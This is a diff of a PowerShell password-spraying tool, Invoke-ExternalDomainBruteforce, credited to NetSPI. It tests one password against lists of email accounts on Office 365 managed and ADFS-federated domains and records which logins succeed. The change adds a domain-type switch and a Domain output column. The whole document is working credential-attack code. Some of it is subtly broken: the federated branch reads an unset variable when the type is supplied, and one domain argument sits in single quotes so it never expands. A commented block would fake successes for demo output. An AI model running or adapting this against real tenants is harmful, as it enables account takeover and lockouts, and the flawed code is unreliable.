@@ -11,19 +11,26 @@
 	       
 	       PS C:\> Invoke-ExternalDomainBruteforce -email test@test.com -password "Password123" -domain "test.com" | ft -AutoSize
 
-			Email              Password      
-			-----              ----          
-			test@test.com      Password123 
+			Email          Domain    Password      
+			-----          ------    ----          
+			test@test.com  test.com  Password123 
 
+	    .EXAMPLE
+	       
+	       PS C:\> Invoke-ExternalDomainBruteforce -email test@test.com -password "Password123" -domain "test.com" -type "managed" | ft -AutoSize
+
+			Email          Domain    Password      
+			-----          ------    ----          
+			test@test.com  test.com  Password123 
 	       
 	    .EXAMPLE
 	       
 	       PS C:\> Invoke-ExternalDomainBruteforce -list "C:\Temp\emails.txt" -password "Password123" -domain "test.com"  | ft -AutoSize
 
-			Email                Password      
-			-----                ----          
-			test@test.com        Password123
-			test39@test.com      Password123 
+			Email           Domain    Password      
+			-----           ------    ----          
+			test@test.com   test.com  Password123 
+			test39@test.com test.com  Password123 
 
 	     .NOTES
 	     Author: Ryan Gandrud (@siegenapster), NetSPI - 2017
@@ -127,7 +134,11 @@ function Invoke-ExternalDomainBruteforce{
 		
 		[Parameter(Mandatory=$false,
         HelpMessage="Location of list of usernames/emails to test. E.g. C:\temp\emails.txt")]
-        [string]$list
+        [string]$list,
+		
+		[Parameter(Mandatory=$false,
+        HelpMessage="Federated or managed domain if you already know which.")]
+        [string]$type
     )
 
 	if($list){
@@ -138,18 +149,25 @@ function Invoke-ExternalDomainBruteforce{
 	}
     else{Write-Host "Please provide an email address or a list of users."; break}
 	
+	if (-Not $type) {
+		# Get-FederationEndpoint for type of domain
+		$info = Get-FederationEndpoint -domain $domain
+		$type = $info[1]
+	}
+	elseif($type -notmatch "managed"){
+		if($type -notmatch "federated"){
+			Write-Host "Check your spelling of the type switch: $($type)"; break}
+	}
+	
     # Create data table to house results
     $EmailTestResults = new-object system.data.datatable
     $EmailTestResults.columns.add("Email") | Out-Null
     $EmailTestResults.columns.add("Domain") | Out-Null
     $EmailTestResults.columns.add("Password") | Out-Null
-    
-	# Get-FederationEndpoint for type of domain
-    $info = Get-FederationEndpoint -domain $domain
-	
-    Write-Verbose "The domain type is $($info[1])"     
+    	
+    Write-Verbose "The domain type is $($type)"     
 
-    if ($info[1] -eq "Managed" ) {
+    if ($type -match "Managed" ) {
 
 		$Users | ForEach-Object {
 		    	
@@ -169,7 +187,7 @@ function Invoke-ExternalDomainBruteforce{
 				
 				# If no error is detected, authentication is successful
 				Write-Host "Authentication Successful: `t'$User' - "$password -ForegroundColor Green
-				$EmailTestResults.Rows.Add($User, "N/A", $password) | Out-Null	
+				$EmailTestResults.Rows.Add($User, $domain, $password) | Out-Null	
 				
 				# Keep track of the last successful authentication
 				$LastSuccessAuth = $User
@@ -188,52 +206,49 @@ function Invoke-ExternalDomainBruteforce{
 		Write-Host "`nWARNING: You still have an active session as "$LastSuccessAuth"`nAny actions against a Managed domain will take place as this user. You have been warned.`nTo close this session, please exit from your PowerShell session." -ForegroundColor Red}
     }
 	
-    ElseIf($info[1] -eq "Federated") {
+    ElseIf($type -match "Federated") {
 		
 		$Users | ForEach-Object {
 		
             $user = $_
 
-		# Check if Invoke-ADFSSecurityTokenRequest is loaded
-		try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
-		catch{Write-Host `n'*Requires the command imported from here - https://gallery.technet.microsoft.com/scriptcenter/Invoke-ADFSSecurityTokenReq-09e9c90c' -ForegroundColor Red;break
-		}
-		
-		# Parse the JSON URI into usable formats
-		$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
-		$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
-		
-		Write-Verbose "Testing $($User) with password $($password)"
-		
-		# Attempt to request a security token using username/password
-		try{
-                	$ErrorActionPreference = "Stop";
-                	Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
-                	$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
-                	Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green
-            	}
-            	catch{
-			# Blog writing mods
-			# if($user -match 'test'){Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green;$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null}
-                	#else{Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red}
+			# Check if Invoke-ADFSSecurityTokenRequest is loaded
+			try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
+			catch{Write-Host `n'*Requires the command imported from here - https://gallery.technet.microsoft.com/scriptcenter/Invoke-ADFSSecurityTokenReq-09e9c90c' -ForegroundColor Red;break
+			}
+			
+			# Parse the JSON URI into usable formats
+			$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
+			$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
+			
+			Write-Verbose "Testing $($User) with password $($password)"
+			
+			# Attempt to request a security token using username/password
+            try{
+                $ErrorActionPreference = "Stop";
+                Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
+                $EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
+                Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green
+            }
+            catch{
+				# Blog writing mods
+				#if($user -match 'test'){Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green;$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null}
+                #else{Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red}
 				
-			Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red
-            	}
+				Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red
+            }
 			
-			
-
 		}
 		Write-Host "`nAuthentication URL: "$info[3] -ForegroundColor Green
 	}
 
-	ElseIf($info[1] -eq "NA"){
+	ElseIf($type -eq "NA"){
 		Write-Host "The domain you are targeting is neither Managed or Federated."
 	}
 	
     Else{
         Write-Host "`nSomething has gone horribly wrong!`nIs your domain name correct?"
     }
-
 
     Return $EmailTestResults
 }
